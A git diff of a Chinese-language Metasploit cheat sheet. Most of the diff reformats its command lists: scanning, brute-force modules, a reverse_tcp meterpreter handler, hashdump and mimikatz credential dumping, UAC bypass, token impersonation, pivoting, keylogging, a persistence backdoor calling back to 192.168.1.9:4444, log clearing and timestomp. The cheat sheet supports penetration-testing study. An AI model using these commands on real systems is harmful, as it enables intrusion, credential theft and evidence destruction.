@@ -32,12 +32,11 @@ db_rebuild_cache
 
 ## 基本使用
 
-```
+```bash
 banner                          # 打印 banner
 color <'true'|'false'|'auto'>   # 切换颜色显示
 back                            # 返回
 use                             # 指定模块
-options                         # 查看模块选项
 info                            # 查看模块信息
 sessions                        # 查看会话
 jobs                            # 显示当前运行进程
@@ -45,6 +44,18 @@ kill                            # 结束进程
 reload_all                      # 重新加载所有模块
 search                          # 搜索模块
 version                         # 显示当前版本
+
+show exploits 			        # 查看所有可用的渗透攻击程序代码
+show auxiliary 			        # 查看所有可用的辅助攻击工具
+show options 			        # 查看该模块所有可用选项
+show payloads 			        # 查看该模块适用的所有载荷代码
+show targets 			        # 查看该模块适用的攻击目标类型
+
+set                             # 设置一个特定的上下文变量的值
+setg                            # 设置一个全局变量的值
+threads                         # 查看和操作后台线程
+unset                           # 取消设置一个或多个特定的上下文变量
+unsetg                          # 取消设置一个或多个全局变量的
 ```
 
 ---
@@ -83,28 +94,30 @@ deb-src http://mirrors.aliyun.com/kali kali-experimental main non-free contrib
 
 ---
 
-## 信息收集
+## 常用模块
+**信息收集**
+
 利用 auxiliary 这个模块来获取目标网端的信息,包括端口开放情况、主机存活情况.
 ```bash
-auxiliary/scanner/discovery/arp_sweep
-auxiliary/scancer/smb/smb_version           # 存活的 445 主机
-auxiliary/scanner/portscan/syn              # 端口扫描
-auxiliary/scanner/telnet/telnet_version     # telent服务扫描
-auxiliary/scanner/rdp/rdp_scanner           # 远程桌面服务扫描
-auxiliary/scanner/ssh/ssh_version           # ssh主机扫描
-auxiliary/scanner/smb/smb_version           # smb服务扫描
-use auxiliary/scanner/ip/ipidseq            # IPID序列扫描器
-use auxiliary/scanner/mssql/mssql_ping      # mssql
-use auxiliary/scanner/http/webdav_scanner   # webdav
+use auxiliary/scanner/discovery/arp_sweep       # arp 扫描
+use auxiliary/scancer/smb/smb_version           # 存活的 445 主机
+use auxiliary/scanner/portscan/syn              # 端口扫描
+use auxiliary/scanner/telnet/telnet_version     # telent 服务扫描
+use auxiliary/scanner/rdp/rdp_scanner           # 远程桌面服务扫描
+use auxiliary/scanner/ssh/ssh_version           # ssh 主机扫描
+use auxiliary/scanner/smb/smb_version           # smb 服务扫描
+use auxiliary/scanner/ip/ipidseq                # IPID 序列扫描器
+use auxiliary/scanner/mssql/mssql_ping          # mssql
+use auxiliary/scanner/http/webdav_scanner       # webdav
 ```
 
-爆破
+**爆破**
 ```bash
-auxiliary/scanner/mysql/mysql_login
-auxiliary/scanner/mssql/mssql_login
-auxiliary/scanner/ssh/ssh_login
+use auxiliary/scanner/mysql/mysql_login         # mysql 爆破
+use auxiliary/scanner/mssql/mssql_login         # mssql 爆破
+use auxiliary/scanner/ssh/ssh_login             # SSH 爆破
 use auxiliary/scanner/snmp/snmp_enum            # snmp_enum
-use auauxiliary/scanner/http/tomcat_mgr_login   # tomcat口令枚举
+use auauxiliary/scanner/http/tomcat_mgr_login   # tomcat 口令枚举
 ```
 
 ---
@@ -112,9 +125,9 @@ use auauxiliary/scanner/http/tomcat_mgr_login   # tomcat口令枚举
 ## meterpreter
 ### 快速上手
 ```bash
-shell   # 获取目标主机的 cmd shell
+shell       # 获取目标主机的 cmd shell
 getsystem   # 命令可以提权到本地系统权限
-sysinfo # 显示系统名,操作系统,架构和语言等.
+sysinfo     # 显示系统名,操作系统,架构和语言等.
 ```
 
 ### 获取会话
@@ -122,8 +135,8 @@ sysinfo # 显示系统名,操作系统,架构和语言等.
 ```bash
 use exploit/multi/handler
 set payload windows/x64/meterpreter_reverse_tcp
-set LHOST
-set LPORT
+set lhost <lhost>
+set lport <lport>
 exploit -j  # 后台执行
 ```
 
@@ -141,33 +154,33 @@ exploit -j  # 后台执行
 
 **环境检测**
 ```bash
-run post/windows/gather/checkvm #是否虚拟机
-run post/linux/gather/checkvm   #是否虚拟机
+run post/windows/gather/checkvm                         # 是否虚拟机
+run post/linux/gather/checkvm                           # 是否虚拟机
 
-getuid  # 查看当前用户
+getuid                                                  # 查看当前用户
 
-run post/windows/gather/enum_applications   # 获取目标主机安装软件信息;
-run post/windows/gather/enum_patches    # 查看目标主机的补丁信息;
-run post/windows/gather/enum_domain # 查找目标主机域控.
-run post/windows/gather/enum_logged_on_users    # 列举当前登陆过主机的用户;
+run post/windows/gather/enum_applications               # 获取目标主机安装软件信息;
+run post/windows/gather/enum_patches                    # 查看目标主机的补丁信息;
+run post/windows/gather/enum_domain                     # 查找目标主机域控.
+run post/windows/gather/enum_logged_on_users            # 列举当前登陆过主机的用户;
 run post/windows/gather/credentials/windows_autologin   # 抓取自动登陆的用户名和密码;
 
-run post/windows/gather/forensics/enum_drives   # 查看分区
-run post/windows/gather/enum_applications   # 获取安装软件信息
-run post/windows/gather/dumplinks   # 获取最近的文件操作
-run post/windows/gather/enum_ie # 获取 IE 缓存
-run post/windows/gather/enum_chrome # 获取 Chrome 缓存
-run post/windows/gather/enum_patches    # 补丁信息
-run post/windows/gather/enum_domain # 查找域控
+run post/windows/gather/forensics/enum_drives           # 查看分区
+run post/windows/gather/enum_applications               # 获取安装软件信息
+run post/windows/gather/dumplinks                       # 获取最近的文件操作
+run post/windows/gather/enum_ie                         # 获取 IE 缓存
+run post/windows/gather/enum_chrome                     # 获取 Chrome 缓存
+run post/windows/gather/enum_patches                    # 补丁信息
+run post/windows/gather/enum_domain                     # 查找域控
 ```
 
 **抓取密码**
 ```bash
-run hashdump    # 获取用户密码 hash 值
-load mimikatz   # 加载 mimikatz,用于抓取密码,不限于明文密码和 hash 值;
-msv # 获取的是 hash 值
-ssp # 获取的是明文信息
-wdigest # 读取内存中存放的账号密码明文信息
+run hashdump                        # 获取用户密码 hash 值
+load mimikatz                       # 加载 mimikatz,用于抓取密码,不限于明文密码和 hash 值;
+msv                                 # 获取的是 hash 值
+ssp                                 # 获取的是明文信息
+wdigest                             # 读取内存中存放的账号密码明文信息
 mimikatz_command -f samdump::hashes # 获取用户 hash
 mimikatz_command -f handle::list    # 列出应用进程
 mimikatz_command -f service::list   # 列出服务
@@ -196,9 +209,9 @@ mimikatz_command -f service::list   # 列出服务
 ```bash
 use exploit/windows/local/bypassuac
 # 将通过进程注入使用可信任发布者证书绕过 Windows UAC.它将生成关闭 UAC 标志的第二个 shell.
-sessions    # 查看目前的 session
-sessions -k # 杀死所有 session
-set session # 设为你需要 exploit 的 session
+sessions        # 查看目前的 session
+sessions -k     # 杀死所有 session
+set session     # 设为你需要 exploit 的 session
 ```
 
 - **Windows权限提升绕过UAC保护(内存注入)**
@@ -254,7 +267,7 @@ lls:显示自己当前系统的所有文件和文件夹.
 
 **上传和下载**
 ```bash
-upload <file> <destination> # 上传文件到 Windows 主机
+upload <file> <destination>     # 上传文件到 Windows 主机
 # 注意:使用 -r 参数可以递归上传上传目录和文件
 
 download <file> <path to save>  # 从 windows 主机下载文件
@@ -264,29 +277,29 @@ download <file> <path to save>  # 从 windows 主机下载文件
 
 **网络命令**
 ```bash
-Ipconfig/ifconfig    # 查看目标主机 IP 地址;
-arp –a  # 用于查看高速缓存中的所有项目;
-route   # 打印路由信息;
-netstat -na # 可以显示所有连接的端口
+Ipconfig/ifconfig   # 查看目标主机 IP 地址;
+arp –a              # 用于查看高速缓存中的所有项目;
+route               # 打印路由信息;
+netstat -na         # 可以显示所有连接的端口
 ```
 
 其中路由信息对于渗透者来说特有用,因为攻击机处于外网,目标主机处于内网,他们之间是不能通信的,故需要添加路由来把攻击机的 IP 添加到内网里面,这样我们就可以横扫内网,就是所谓的内网代理.
 
 首先我们需要获取网段,然后再添加路由,添加成功后就可以横向扫描内网主机.
 ```bash
-run get_local_subnets   # 获取网段
+run get_local_subnets               # 获取网段
 run autoroute -s 192.168.205.1/24   # 添加路由
-run autoroute -p    # 查看路由
-run autoroute -d -s 172.2.175.0 # 删除网段
+run autoroute -p                    # 查看路由
+run autoroute -d -s 172.2.175.0     # 删除网段
 run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24   # 探测该网段下的存活主机.
-meterpreter > background    # 后台 sessions
+meterpreter > background            # 后台 sessions
 ```
 
 **获取凭证**
 ```bash
 run hashdump
 
-load mimikatz   # 加载 mimikatz 模块
+load mimikatz       # 加载 mimikatz 模块
 wdigest
 kerberos
 ```
@@ -301,22 +314,22 @@ run post/windows/manage/enable_rdp username=test password=test  # 添加远程�
 
 在用户登录 windows 操作系统时,系统都会给用户分配一个令牌(Token),当用户访问系统资源时都会使用这个令牌进行身份验证,功能类似于网站的 session 或者 cookie.
 
-msf提供了一个功能模块可以让我们假冒别人的令牌,实现身份切换,如果目标环境是域环境,刚好域管理员登录过我们已经有权限的终端,那么就可以假冒成域管理员的角色.
+msf 提供了一个功能模块可以让我们假冒别人的令牌,实现身份切换,如果目标环境是域环境,刚好域管理员登录过我们已经有权限的终端,那么就可以假冒成域管理员的角色.
 ```bash
-getuid  # 查看当前用户
-use incognito   # 进入该模块
-list_tokens -u  # 查看存在的令牌
-impersonate_token 用户名    # 令牌假冒
+getuid                          # 查看当前用户
+use incognito                   # 进入该模块
+list_tokens -u                  # 查看存在的令牌
+impersonate_token <Username>    # 令牌假冒
 # 注意用户名的斜杠需要写两个.
 
-getuid  # 查看是否切换成功
+getuid                          # 查看是否切换成功
 ```
 
 **sniffer**
 ```bash
 use sniffer
-sniffer_interfaces  # 查看网卡信息
-sniffer_start 1 # 开始在序号为1的网卡上抓包
+sniffer_interfaces          # 查看网卡信息
+sniffer_start 1             # 开始在序号为1的网卡上抓包
 sniffer_dump 1 xpsp1.cap    # 下载抓取到的数据包
 ```
 
@@ -342,7 +355,7 @@ run
 
     pivot 是 msf 最常用的代理,可以让我们使用 msf 提供的扫描模块对内网进行探测.
     ```bash
-    route add 内网ip 子网掩码 session的id   # 添加一个路由
+    route add <ip> <mask> <session id>      # 添加一个路由
     route print
 
     如果其它程序需要访问这个内网环境,就可以建立 socks 代理
@@ -354,7 +367,7 @@ run
     use auxiliary/server/socks4a
     SRVHOST:监听的 ip 地址,默认为 0.0.0.0,一般不需要更改.
     SRVPORT:监听的端口,默认为 1080.
-    直接运行run命令,就可以成功创建一个 socks4 代理隧道,在 linux 上可以配置 proxychains 使用,在 windows 可以配置 Proxifier 进行使用.
+    直接运行 run 命令,就可以成功创建一个 socks4 代理隧道,在 linux 上可以配置 proxychains 使用,在 windows 可以配置 Proxifier 进行使用.
     ```
 
 ### 权限维持
@@ -370,29 +383,29 @@ run killav
 
 **键盘记录**
 ```bash
-keyscan_start:开启键盘记录功能
-keyscan_dump:显示捕捉到的键盘记录信息
-keyscan_stop:停止键盘记录功能
+keyscan_start   # 开启键盘记录功能
+keyscan_dump    # 显示捕捉到的键盘记录信息
+keyscan_stop    # 停止键盘记录功能
 ```
 
 **执行程序**
 ```bash
-execute -f <path> [options] 在目标主机上执行 exe 文件
--H:创建一个隐藏进程
--a:传递给命令的参数
--i:跟进程进行交互
--m:从内存中执行
--t:使用当前伪造的线程令牌运行进程
--s:在给定会话中执行进程
+execute -f <path> [options] # 在目标主机上执行 exe 文件
+-H : 创建一个隐藏进程
+-a : 传递给命令的参数
+-i : 跟进程进行交互
+-m : 从内存中执行
+-t : 使用当前伪造的线程令牌运行进程
+-s : 在给定会话中执行进程
 ```
 
 **进程迁移**
 
 当 meterpreter 单独作为一个进程运行时容易被发现,如果将它和系统经常运行的进程进行绑定,就能够实现持久化.
 ```bash
-getpid  # 查看当前会话的进程 id
-ps  # 查看目标运行的进程
-migrate pid # 绑定/迁移进程
+getpid          # 查看当前会话的进程 id
+ps              # 查看目标运行的进程
+migrate pid     # 绑定/迁移进程
 ```
 
 **后门**
@@ -414,16 +427,16 @@ Meterpreter 的 shell 运行在内存中,目标重启就会失效,如果管理�
 - **persistence**
     ```bash
     run persistence -X -i 10 -r 192.168.1.9 -p 4444
-    -A:安装后门后,自动启动 exploit/multi/handler 模块连接后门
-    -L:自启动脚本的路径,默认为 %TEMP%
-    -P:需要使用的 payload,默认为 windows/meterpreter/reverse_tcp
-    -S:作为一个服务在系统启动时运行(需要 SYSTEM 权限)
-    -T:要使用的备用可执行模板
-    -U:用户登陆时运行
-    -X:系统启动时运行
-    -i:后门每隔多少秒尝试连接服务端
-    -p:服务端监听的端口
-    -r:服务端 ip
+    -A : 安装后门后,自动启动 exploit/multi/handler 模块连接后门
+    -L : 自启动脚本的路径,默认为 %TEMP%
+    -P : 需要使用的 payload,默认为 windows/meterpreter/reverse_tcp
+    -S : 作为一个服务在系统启动时运行(需要 SYSTEM 权限)
+    -T : 要使用的备用可执行模板
+    -U : 用户登陆时运行
+    -X : 系统启动时运行
+    -i : 后门每隔多少秒尝试连接服务端
+    -p : 服务端监听的端口
+    -r : 服务端 ip
     ```
 
 **RDP**
@@ -434,12 +447,12 @@ run post/windows/manage/enable_rdp username=xxx password=xxx    # 添加远程�
 
 ### 痕迹清除
 ```bash
-clearev # 入侵痕迹擦除
+clearev     # 入侵痕迹擦除
 ```
 
 **反电子取证**
 ```bash
-timestomp -v secist.txt # 查看当前目标文件 MACE 时间.
+timestomp -v secist.txt                     # 查看当前目标文件 MACE 时间.
 timestomp -f c:\\AVScanner.ini secist.txt   # 将模板文件 MACE 时间,复制给当前文件
 timestomp -v secist.txt
 ```
